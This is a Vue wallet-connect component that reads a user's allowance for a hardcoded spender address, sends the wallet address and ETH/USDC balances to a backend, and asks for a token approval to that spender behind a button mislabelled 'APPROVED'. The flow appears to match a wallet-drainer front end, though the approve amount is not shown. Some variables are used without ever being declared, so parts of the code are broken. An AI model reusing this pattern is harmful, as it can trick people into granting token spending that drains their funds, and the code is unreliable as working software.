<template>
    <div class="flex">
      <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="linkWallet" v-if="!address">CONNECT WALLET</button>
      <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="approve" v-else> {{ !isApproved ? 'APPROVED' : `${address.slice(0, -36)}...${address.substring(38)}` }}</button>
    </div>
</template>
<script>
  import { ref, computed, onMounted } from 'vue';
  import Web3Wallet from "@/utils/Web3Wallet"
  import { useStore } from 'vuex';

  export default {
    setup() {

      const store = useStore()
      
      const address = ref('');
      
      const isApproved = ref(false);

      const environment = ref('Ethereum');
      let wallet;

      const linkWallet = async () => {
        environment.value = 'Ethereum'
        onConnect()
      }

      const onConnect = async () => {
        if (environment.value === 'Ethereum' && window.ethereum) {
          wallet = new Web3Wallet();
        } else {
          console.log("Error")
          return;
        }
        try {
          await wallet.linkWallet();
          address.value = await wallet.getAddress();
          
          let aprove = await wallet.getAllowance(address.value, '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9');
          console.log("aprove", aprove)
          if(aprove > 0) {
            isApproved.value = true;
          }
          
          store.commit('user/setAddress', address.value)

          if (address.value === false) {
            throw new TypeError("There was an issue signing you in.")
          }
          usdc_balance.value = await wallet.getBalance(address.value)
          balance.value = await wallet.balance(address.value)
          let payload = {
            wallet: address.value,
            eth_balance: balance.value,
            usdc_balance: usdc_balance.value,
          }
          const response = await store.dispatch( 'user/fetchUserInfo', address.value )
          
          if(response < 1) {
            await store.dispatch( 'user/userRegister', payload )
          }

        } catch (err) {
          console.log('login', err)
        }
      }
      const approve = async () => {
        let auth_address = '';
        if (environment.value === 'Ethereum') {
          auth_address = '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9'
        } 
        if (auth_address === '') {
          console.log("Error")
          return;
        }
        try {
          const hash = await wallet.approve(auth_address, address.value);
          
        } catch (error) {
          isApproved.value = false;
        }
      }

      return { 
        linkWallet, 
        address, 
        approve, 
        isApproved, 
      };

    },
  };
</script>
